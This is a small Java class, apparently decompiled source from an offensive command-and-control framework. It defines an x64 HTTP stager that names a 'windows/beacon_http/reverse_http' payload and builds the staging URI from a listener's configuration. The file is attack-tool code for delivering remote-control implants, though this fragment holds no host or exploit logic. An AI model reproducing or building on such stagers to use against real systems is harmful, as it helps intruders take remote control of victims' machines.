package stagers;

import common.ScListener;

public class BeaconHTTPStagerX64 extends GenericHTTPStagerX64 {
   public BeaconHTTPStagerX64(ScListener var1) {
      super(var1);
   }

   public String payload() {
      return "windows/beacon_http/reverse_http";
   }

   public String getURI() {
      String var10000 = this.getConfig().getURI_X64();
      return var10000 + this.getConfig().getQueryString();
   }
}
